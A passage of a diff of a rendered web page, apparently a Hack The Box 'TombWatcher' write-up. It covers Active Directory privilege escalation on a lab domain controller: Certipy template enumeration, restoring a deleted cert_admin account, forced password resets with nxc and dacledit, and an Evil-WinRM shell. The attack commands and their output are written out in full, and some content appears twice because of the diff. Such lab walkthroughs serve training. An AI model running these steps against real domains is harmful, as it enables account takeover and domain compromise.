-<h2 id="privilege-escalation-path-to-domain-admin">Privilege Escalation: Path to Domain Admin</h2>
-<p>The user john has GenericAll privileges over <a href="mailto:ADCS@TOMBWATCHER.HTB" rel="">ADCS@TOMBWATCHER.HTB</a>. This could be an interesting place to investigate.</p>
-<p><img
-        class="lazyload"
-        src="/f0dh1l/svg/loading.min.svg"
-        data-src="/f0dh1l/images/htb_tombwatcher/image-2.png"
-        data-srcset="/f0dh1l/images/htb_tombwatcher/image-2.png, /f0dh1l/images/htb_tombwatcher/image-2.png 1.5x, /f0dh1l/images/htb_tombwatcher/image-2.png 2x"
-        data-sizes="auto"
-        alt="/f0dh1l/images/htb_tombwatcher/image-2.png"
-        title="alt text" /></p>
-<h3 id="investigating-the-adcs">Investigating the ADCS</h3>
-<p>We can investigate the ADCS using Certipy:</p>
-<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
-    <div class="code-header language-bash">
-        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
-        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
-    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">certipy-ad find -u <span class="s1">&#39;john@tombwatcher.htb&#39;</span> -p <span class="s1">&#39;NewPassword&#39;</span> -dc-ip 10.10.11.72 --vulnerable -stdout
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">Certipy v5.0.2 - by Oliver Lyak <span class="o">(</span>ly4k<span class="o">)</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Finding certificate templates
-</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Found <span class="m">33</span> certificate templates
-</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Finding certificate authorities
-</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Found <span class="m">1</span> certificate authority
-</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Found <span class="m">11</span> enabled certificate templates
-</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Finding issuance policies
-</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Found <span class="m">13</span> issuance policies
-</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Found <span class="m">0</span> OIDs linked to templates
-</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Retrieving CA configuration <span class="k">for</span> <span class="s1">&#39;tombwatcher-CA-1&#39;</span> via RRP
-</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> Failed to connect to remote registry. Service should be starting now. Trying again...
-</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Successfully retrieved CA configuration <span class="k">for</span> <span class="s1">&#39;tombwatcher-CA-1&#39;</span>
-</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Checking web enrollment <span class="k">for</span> CA <span class="s1">&#39;tombwatcher-CA-1&#39;</span> @ <span class="s1">&#39;DC01.tombwatcher.htb&#39;</span>
-</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> Error checking web enrollment: timed out
-</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> Use -debug to print a stacktrace
-</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> Failed to lookup object with SID <span class="s1">&#39;S-1-5-21-1392491010-1358638721-2126982587-1111&#39;</span>
-</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Enumeration output:
-</span></span><span class="line"><span class="cl">Certificate Authorities
-</span></span><span class="line"><span class="cl">   <span class="m">17</span>
-</span></span><span class="line"><span class="cl">    Template Name                       : WebServer
-</span></span><span class="line"><span class="cl">    Display Name                        : Web Server
-</span></span><span class="line"><span class="cl">    Certificate Authorities             : tombwatcher-CA-1
-</span></span><span class="line"><span class="cl">    Enabled                             : True
-</span></span><span class="line"><span class="cl">    Client Authentication               : False
-</span></span><span class="line"><span class="cl">    Enrollment Agent                    : False
-</span></span><span class="line"><span class="cl">    Any Purpose                         : False
-</span></span><span class="line"><span class="cl">    Enrollee Supplies Subject           : True
-</span></span><span class="line"><span class="cl">    Certificate Name Flag               : EnrolleeSuppliesSubject
-</span></span><span class="line"><span class="cl">    Extended Key Usage                  : Server Authentication
-</span></span><span class="line"><span class="cl">    Requires Manager Approval           : False
-</span></span><span class="line"><span class="cl">    Requires Key Archival               : False
-</span></span><span class="line"><span class="cl">    Authorized Signatures Required      : <span class="m">0</span>
-</span></span><span class="line"><span class="cl">    Schema Version                      : <span class="m">1</span>
-</span></span><span class="line"><span class="cl">    Validity Period                     : <span class="m">2</span> years
-</span></span><span class="line"><span class="cl">    Renewal Period                      : <span class="m">6</span> weeks
-</span></span><span class="line"><span class="cl">    Minimum RSA Key Length              : <span class="m">2048</span>
-</span></span><span class="line"><span class="cl">    Template Created                    : 2024-11-16T00:57:49+00:00
-</span></span><span class="line"><span class="cl">    Template Last Modified              : 2024-11-16T17:07:26+00:00
-</span></span><span class="line"><span class="cl">    Permissions
-</span></span><span class="line"><span class="cl">      Enrollment Permissions
-</span></span><span class="line"><span class="cl">        Enrollment Rights               : TOMBWATCHER.HTB<span class="se">\D</span>omain Admins
-</span></span><span class="line"><span class="cl">                                          TOMBWATCHER.HTB<span class="se">\E</span>nterprise Admins
-</span></span><span class="line"><span class="cl">                                          S-1-5-21-1392491010-1358638721-2126982587-1111
-</span></span><span class="line"><span class="cl">      Object Control Permissions
-</span></span><span class="line"><span class="cl">        Owner                           : TOMBWATCHER.HTB<span class="se">\E</span>nterprise Admins
-</span></span><span class="line"><span class="cl">        Full Control Principals         : TOMBWATCHER.HTB<span class="se">\D</span>omain Admins
-</span></span><span class="line"><span class="cl">                                          TOMBWATCHER.HTB<span class="se">\E</span>nterprise Admins
-</span></span><span class="line"><span class="cl">        Write Owner Principals          : TOMBWATCHER.HTB<span class="se">\D</span>omain Admins
-</span></span><span class="line"><span class="cl">                                          TOMBWATCHER.HTB<span class="se">\E</span>nterprise Admins
-</span></span><span class="line"><span class="cl">        Write Dacl Principals           : TOMBWATCHER.HTB<span class="se">\D</span>omain Admins
-</span></span><span class="line"><span class="cl">                                          TOMBWATCHER.HTB<span class="se">\E</span>nterprise Admins
-</span></span><span class="line"><span class="cl">        Write Property Enroll           : TOMBWATCHER.HTB<span class="se">\D</span>omain Admins
-</span></span><span class="line"><span class="cl">                                          TOMBWATCHER.HTB<span class="se">\E</span>nterprise Admins
-</span></span><span class="line"><span class="cl">                                          S-1-5-21-1392491010-1358638721-2126982587-1111</span></span></code></pre></div></div>
-<p>We can see that there is an interesting entity that has enrollment rights, but it has an unresolved SID: S-1-5-21-1392491010-1358638721-2126982587-1111</p>
-<p>This suggests a potential misconfiguration or deleted privilege still present on the template. If the SID belonged to a previously deleted user with vulnerabilities, this could be leveraged for privilege escalation or abuse of certificate enrollment.</p>
-<h3 id="discovering-deleted-users">Discovering Deleted Users</h3>
-<p>Now we can check the Active Directory Recycle Bin (on the host) for deleted users by using previously founded information.</p>
-<p>Once on the box as john, I imported the Active Directory module and searched for deleted objects:</p>
-<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
-    <div class="code-header language-powershell">
-        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
-        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
-    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">Import-Module</span> <span class="n">ActiveDirectory</span>
-</span></span><span class="line"><span class="cl"><span class="nb">Get-ADObject</span> <span class="n">-Filter</span> <span class="s1">&#39;isDeleted -eq $true -and objectClass -eq &#34;user&#34;&#39;</span> <span class="n">-IncludeDeletedObjects</span> <span class="n">-Properties</span> <span class="p">*</span> <span class="p">|</span> <span class="nb">Select-Object</span> <span class="n">Name</span><span class="p">,</span><span class="n">SamAccountName</span><span class="p">,</span><span class="n">DistinguishedName</span><span class="p">,</span><span class="n">WhenChanged</span><span class="p">,</span><span class="n">ObjectGUID</span></span></span></code></pre></div></div>
-<p>This revealed multiple deleted instances of a user named <strong><code>cert_admin</code></strong>:</p>
-<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
-    <div class="code-header language-powershell">
-        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
-        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
-    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">Name</span>              <span class="err">:</span> <span class="n">cert_admin</span>
-</span></span><span class="line"><span class="cl">                    <span class="n">DEL</span><span class="err">:</span><span class="n">f80369c8</span><span class="p">-</span><span class="n">96a2</span><span class="p">-</span><span class="n">4a7f-a56c</span><span class="p">-</span><span class="n">9c15edd7d1e3</span>
-</span></span><span class="line"><span class="cl"><span class="n">SamAccountName</span>    <span class="err">:</span> <span class="n">cert_admin</span>
-</span></span><span class="line"><span class="cl"><span class="n">DistinguishedName</span> <span class="err">:</span> <span class="n">CN</span><span class="p">=</span><span class="n">cert_admin</span><span class="p">\</span><span class="n">0ADEL</span><span class="err">:</span><span class="n">f80369c8</span><span class="p">-</span><span class="n">96a2</span><span class="p">-</span><span class="n">4a7f-a56c</span><span class="p">-</span><span class="n">9c15edd7d1e3</span><span class="p">,</span><span class="n">CN</span><span class="p">=</span><span class="n">Deleted</span> <span class="n">Objects</span><span class="p">,</span><span class="n">DC</span><span class="p">=</span><span class="n">tombwatcher</span><span class="p">,</span><span class="n">DC</span><span class="p">=</span><span class="n">htb</span>
-</span></span><span class="line"><span class="cl"><span class="n">WhenChanged</span>       <span class="err">:</span> <span class="mf">11</span><span class="p">/</span><span class="mf">15</span><span class="p">/</span><span class="mf">2024</span> <span class="mf">7</span><span class="err">:</span><span class="mf">57</span><span class="err">:</span><span class="mf">59</span> <span class="n">PM</span>
-</span></span><span class="line"><span class="cl"><span class="n">ObjectGUID</span>        <span class="err">:</span> <span class="n">f80369c8</span><span class="p">-</span><span class="n">96a2</span><span class="p">-</span><span class="n">4a7f-a56c</span><span class="p">-</span><span class="n">9c15edd7d1e3</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="n">Name</span>              <span class="err">:</span> <span class="n">cert_admin</span>
-</span></span><span class="line"><span class="cl">                    <span class="n">DEL</span><span class="err">:</span><span class="nb">c1f1f0fe-df9c</span><span class="p">-</span><span class="n">494c-bf05</span><span class="p">-</span><span class="n">0679e181b358</span>
-</span></span><span class="line"><span class="cl"><span class="n">SamAccountName</span>    <span class="err">:</span> <span class="n">cert_admin</span>
-</span></span><span class="line"><span class="cl"><span class="n">DistinguishedName</span> <span class="err">:</span> <span class="n">CN</span><span class="p">=</span><span class="n">cert_admin</span><span class="p">\</span><span class="n">0ADEL</span><span class="err">:</span><span class="nb">c1f1f0fe-df9c</span><span class="p">-</span><span class="n">494c-bf05</span><span class="p">-</span><span class="n">0679e181b358</span><span class="p">,</span><span class="n">CN</span><span class="p">=</span><span class="n">Deleted</span> <span class="n">Objects</span><span class="p">,</span><span class="n">DC</span><span class="p">=</span><span class="n">tombwatcher</span><span class="p">,</span><span class="n">DC</span><span class="p">=</span><span class="n">htb</span>
-</span></span><span class="line"><span class="cl"><span class="n">WhenChanged</span>       <span class="err">:</span> <span class="mf">11</span><span class="p">/</span><span class="mf">16</span><span class="p">/</span><span class="mf">2024</span> <span class="mf">12</span><span class="err">:</span><span class="mf">04</span><span class="err">:</span><span class="mf">21</span> <span class="n">PM</span>
-</span></span><span class="line"><span class="cl"><span class="n">ObjectGUID</span>        <span class="err">:</span> <span class="nb">c1f1f0fe-df9c</span><span class="p">-</span><span class="n">494c-bf05</span><span class="p">-</span><span class="n">0679e181b358</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="n">Name</span>              <span class="err">:</span> <span class="n">cert_admin</span>
-</span></span><span class="line"><span class="cl">                    <span class="n">DEL</span><span class="err">:</span><span class="n">938182c3-bf0b</span><span class="p">-</span><span class="n">410a</span><span class="p">-</span><span class="n">9aaa</span><span class="p">-</span><span class="n">45c8e1a02ebf</span>
-</span></span><span class="line"><span class="cl"><span class="n">SamAccountName</span>    <span class="err">:</span> <span class="n">cert_admin</span>
-</span></span><span class="line"><span class="cl"><span class="n">DistinguishedName</span> <span class="err">:</span> <span class="n">CN</span><span class="p">=</span><span class="n">cert_admin</span><span class="p">\</span><span class="n">0ADEL</span><span class="err">:</span><span class="n">938182c3-bf0b</span><span class="p">-</span><span class="n">410a</span><span class="p">-</span><span class="n">9aaa</span><span class="p">-</span><span class="n">45c8e1a02ebf</span><span class="p">,</span><span class="n">CN</span><span class="p">=</span><span class="n">Deleted</span> <span class="n">Objects</span><span class="p">,</span><span class="n">DC</span><span class="p">=</span><span class="n">tombwatcher</span><span class="p">,</span><span class="n">DC</span><span class="p">=</span><span class="n">htb</span>
-</span></span><span class="line"><span class="cl"><span class="n">WhenChanged</span>       <span class="err">:</span> <span class="mf">11</span><span class="p">/</span><span class="mf">16</span><span class="p">/</span><span class="mf">2024</span> <span class="mf">12</span><span class="err">:</span><span class="mf">07</span><span class="err">:</span><span class="mf">27</span> <span class="n">PM</span>
-</span></span><span class="line"><span class="cl"><span class="n">ObjectGUID</span>        <span class="err">:</span> <span class="n">938182c3-bf0b</span><span class="p">-</span><span class="n">410a</span><span class="p">-</span><span class="n">9aaa</span><span class="p">-</span><span class="n">45c8e1a02ebf</span></span></span></code></pre></div></div>
-<h3 id="restoring-cert_admin">Restoring cert_admin</h3>
-<p>I restored the most recent deleted user using its ObjectGUID:</p>
-<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
-    <div class="code-header language-powershell">
-        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
-        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
-    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">Restore-ADObject</span> <span class="n">-Identity</span> <span class="n">938182c3-bf0b</span><span class="p">-</span><span class="n">410a</span><span class="p">-</span><span class="n">9aaa</span><span class="p">-</span><span class="n">45c8e1a02ebf</span></span></span></code></pre></div></div>
-<p>I verified the restoration with <code>net user</code> and confirmed the account existed. I then examined the user&rsquo;s properties:</p>
-<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
-    <div class="code-header language-powershell">
-        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
-        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
-    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">Get-ADUser</span> <span class="n">cert_admin</span> <span class="n">-Properties</span> <span class="p">*</span> <span class="p">|</span> <span class="nb">Select-Object</span> <span class="n">Name</span><span class="p">,</span> <span class="n">SamAccountName</span><span class="p">,</span> <span class="n">DistinguishedName</span><span class="p">,</span> <span class="n">Enabled</span><span class="p">,</span> <span class="n">GivenName</span><span class="p">,</span> <span class="n">Surname</span><span class="p">,</span> <span class="n">UserPrincipalName</span><span class="p">,</span> <span class="n">WhenCreated</span><span class="p">,</span> <span class="n">WhenChanged</span><span class="p">,</span> <span class="n">LastLogonTimestamp</span><span class="p">,</span> <span class="n">PasswordExpired</span><span class="p">,</span> <span class="n">PasswordNeverExpires</span><span class="p">,</span> <span class="n">ServicePrincipalName</span><span class="p">,</span> <span class="n">MemberOf</span></span></span></code></pre></div></div>
-<p>The user <code>cert_admin</code> was located in the <strong>ADCS OU</strong>, and since john has <strong>GenericAll</strong> privileges on this OU, I could change cert_admin&rsquo;s password:</p>
-<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
-    <div class="code-header language-bash">
-        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
-        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
-    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nxc smb 10.10.11.72 -u <span class="s1">&#39;john&#39;</span> -p NewPassword -M change-password -o <span class="nv">USER</span><span class="o">=</span>cert_admin <span class="nv">NEWPASS</span><span class="o">=</span>NewPassword</span></span></code></pre></div></div>
-<p>✅ <strong>Success!</strong> cert_admin&rsquo;s password was now <code>NewPassword</code>.</p>
-<hr>
-<h2 id="adcs-exploitation-esc15-attack">ADCS Exploitation: ESC15 Attack</h2>
-<h3 id="enumerating-certificate-templates">Enumerating Certificate Templates</h3>
-<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
-    <div class="code-header language-bash">
-        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
-        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
-    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">certipy find -u <span class="s1">&#39;cert_admin@tombwatcher.htb&#39;</span> -p <span class="s1">&#39;NewPassword&#39;</span> -dc-ip <span class="s1">&#39;10.10.11.72&#39;</span> -text -vulnerable</span></span></code></pre></div></div>
-<p>This gives the following output:</p>
-<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
-    <div class="code-header language-">
-        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
-        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
-    </div><pre tabindex="0"><code>Certificate Authorities
+[*] OwnerSid modified successfully!</code></pre></div><h3 id=step-5-granting-full-control-and-password-reset>Step 5: Granting Full Control and Password Reset</h3><p>With ownership of john, I granted sam <strong>FullControl</strong> over john&rsquo;s account:</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-bash"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
+<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
+<span class=copy title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>dacledit.py -action <span class=s1>&#39;write&#39;</span> -rights <span class=s1>&#39;FullControl&#39;</span> -principal <span class=s1>&#39;sam&#39;</span> -target <span class=s1>&#39;john&#39;</span> <span class=s1>&#39;tombwatcher.htb/sam:NewPassword&#39;</span></span></span></code></pre></div></div><p><strong>Result:</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
+<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
+<span class=copy title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><pre tabindex=0><code>[*] DACL backed up to dacledit-20251001-174816.bak
+[*] DACL modified successfully!</code></pre></div><p>Now I could reset john&rsquo;s password:</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-bash"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
+<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
+<span class=copy title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>nxc smb 10.10.11.72 -u <span class=s1>&#39;sam&#39;</span> -p NewPassword -M change-password -o <span class=nv>USER</span><span class=o>=</span>john <span class=nv>NEWPASS</span><span class=o>=</span>NewPassword</span></span></code></pre></div></div><p><strong>Result:</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-bash"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
+<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
+<span class=copy title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>SMB         10.10.11.72     <span class=m>445</span>    DC01             <span class=o>[</span>*<span class=o>]</span> Windows <span class=m>10</span> / Server <span class=m>2019</span> Build <span class=m>17763</span> x64 <span class=o>(</span>name:DC01<span class=o>)</span> <span class=o>(</span>domain:tombwatcher.htb<span class=o>)</span> <span class=o>(</span>signing:True<span class=o>)</span> <span class=o>(</span>SMBv1:False<span class=o>)</span> <span class=o>(</span>Null Auth:True<span class=o>)</span>
+</span></span><span class=line><span class=cl>SMB         10.10.11.72     <span class=m>445</span>    DC01             <span class=o>[</span>+<span class=o>]</span> tombwatcher.htb<span class=se>\s</span>am:NewPassword 
+</span></span><span class=line><span class=cl>CHANGE-P... 10.10.11.72     <span class=m>445</span>    DC01             <span class=o>[</span>+<span class=o>]</span> Successfully changed password <span class=k>for</span> john</span></span></code></pre></div></div><h3 id=step-6-initial-shell-as-john>Step 6: Initial Shell as john</h3><p>With john&rsquo;s credentials compromised, I connected via Evil-WinRM:</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-bash"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
+<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
+<span class=copy title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>evil-winrm -i 10.10.11.72 -u john -p NewPassword</span></span></code></pre></div></div><p>✅ <strong>User flag obtained!</strong></p><p>At this point, I noticed john has <strong>GenericAll</strong> privileges on the ADCS OU, which would be crucial for the next phase.</p><hr><h2 id=privilege-escalation-path-to-domain-admin>Privilege Escalation: Path to Domain Admin</h2><p>The user john has GenericAll privileges over <a href=mailto:ADCS@TOMBWATCHER.HTB rel>ADCS@TOMBWATCHER.HTB</a>. This could be an interesting place to investigate.</p><p><img class=lazyload src=/f0dh1l/svg/loading.min.svg data-src=/f0dh1l/images/htb_tombwatcher/image-2.png data-srcset="/f0dh1l/images/htb_tombwatcher/image-2.png, /f0dh1l/images/htb_tombwatcher/image-2.png 1.5x, /f0dh1l/images/htb_tombwatcher/image-2.png 2x" data-sizes=auto alt=/f0dh1l/images/htb_tombwatcher/image-2.png title="alt text"></p><h3 id=investigating-the-adcs>Investigating the ADCS</h3><p>We can investigate the ADCS using Certipy:</p><div class="code-block code-line-numbers" style="counter-reset:code-block 0"><div class="code-header language-bash"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
+<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
+<span class=copy title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>certipy-ad find -u <span class=s1>&#39;john@tombwatcher.htb&#39;</span> -p <span class=s1>&#39;NewPassword&#39;</span> -dc-ip 10.10.11.72 --vulnerable -stdout
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Certipy v5.0.2 - by Oliver Lyak <span class=o>(</span>ly4k<span class=o>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Finding certificate templates
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Found <span class=m>33</span> certificate templates
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Finding certificate authorities
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Found <span class=m>1</span> certificate authority
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Found <span class=m>11</span> enabled certificate templates
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Finding issuance policies
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Found <span class=m>13</span> issuance policies
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Found <span class=m>0</span> OIDs linked to templates
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Retrieving CA configuration <span class=k>for</span> <span class=s1>&#39;tombwatcher-CA-1&#39;</span> via RRP
+</span></span><span class=line><span class=cl><span class=o>[</span>!<span class=o>]</span> Failed to connect to remote registry. Service should be starting now. Trying again...
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Successfully retrieved CA configuration <span class=k>for</span> <span class=s1>&#39;tombwatcher-CA-1&#39;</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Checking web enrollment <span class=k>for</span> CA <span class=s1>&#39;tombwatcher-CA-1&#39;</span> @ <span class=s1>&#39;DC01.tombwatcher.htb&#39;</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>!<span class=o>]</span> Error checking web enrollment: timed out
+</span></span><span class=line><span class=cl><span class=o>[</span>!<span class=o>]</span> Use -debug to print a stacktrace
+</span></span><span class=line><span class=cl><span class=o>[</span>!<span class=o>]</span> Failed to lookup object with SID <span class=s1>&#39;S-1-5-21-1392491010-1358638721-2126982587-1111&#39;</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Enumeration output:
+</span></span><span class=line><span class=cl>Certificate Authorities
+</span></span><span class=line><span class=cl>   <span class=m>17</span>
+</span></span><span class=line><span class=cl>    Template Name                       : WebServer
+</span></span><span class=line><span class=cl>    Display Name                        : Web Server
+</span></span><span class=line><span class=cl>    Certificate Authorities             : tombwatcher-CA-1
+</span></span><span class=line><span class=cl>    Enabled                             : True
+</span></span><span class=line><span class=cl>    Client Authentication               : False
+</span></span><span class=line><span class=cl>    Enrollment Agent                    : False
+</span></span><span class=line><span class=cl>    Any Purpose                         : False
+</span></span><span class=line><span class=cl>    Enrollee Supplies Subject           : True
+</span></span><span class=line><span class=cl>    Certificate Name Flag               : EnrolleeSuppliesSubject
+</span></span><span class=line><span class=cl>    Extended Key Usage                  : Server Authentication
+</span></span><span class=line><span class=cl>    Requires Manager Approval           : False
+</span></span><span class=line><span class=cl>    Requires Key Archival               : False
+</span></span><span class=line><span class=cl>    Authorized Signatures Required      : <span class=m>0</span>
+</span></span><span class=line><span class=cl>    Schema Version                      : <span class=m>1</span>
+</span></span><span class=line><span class=cl>    Validity Period                     : <span class=m>2</span> years
+</span></span><span class=line><span class=cl>    Renewal Period                      : <span class=m>6</span> weeks
+</span></span><span class=line><span class=cl>    Minimum RSA Key Length              : <span class=m>2048</span>
+</span></span><span class=line><span class=cl>    Template Created                    : 2024-11-16T00:57:49+00:00
+</span></span><span class=line><span class=cl>    Template Last Modified              : 2024-11-16T17:07:26+00:00
+</span></span><span class=line><span class=cl>    Permissions
+</span></span><span class=line><span class=cl>      Enrollment Permissions
+</span></span><span class=line><span class=cl>        Enrollment Rights               : TOMBWATCHER.HTB<span class=se>\D</span>omain Admins
+</span></span><span class=line><span class=cl>                                          TOMBWATCHER.HTB<span class=se>\E</span>nterprise Admins
+</span></span><span class=line><span class=cl>                                          S-1-5-21-1392491010-1358638721-2126982587-1111
+</span></span><span class=line><span class=cl>      Object Control Permissions
+</span></span><span class=line><span class=cl>        Owner                           : TOMBWATCHER.HTB<span class=se>\E</span>nterprise Admins
+</span></span><span class=line><span class=cl>        Full Control Principals         : TOMBWATCHER.HTB<span class=se>\D</span>omain Admins
+</span></span><span class=line><span class=cl>                                          TOMBWATCHER.HTB<span class=se>\E</span>nterprise Admins
+</span></span><span class=line><span class=cl>        Write Owner Principals          : TOMBWATCHER.HTB<span class=se>\D</span>omain Admins
+</span></span><span class=line><span class=cl>                                          TOMBWATCHER.HTB<span class=se>\E</span>nterprise Admins
+</span></span><span class=line><span class=cl>        Write Dacl Principals           : TOMBWATCHER.HTB<span class=se>\D</span>omain Admins
+</span></span><span class=line><span class=cl>                                          TOMBWATCHER.HTB<span class=se>\E</span>nterprise Admins
+</span></span><span class=line><span class=cl>        Write Property Enroll           : TOMBWATCHER.HTB<span class=se>\D</span>omain Admins
+</span></span><span class=line><span class=cl>                                          TOMBWATCHER.HTB<span class=se>\E</span>nterprise Admins
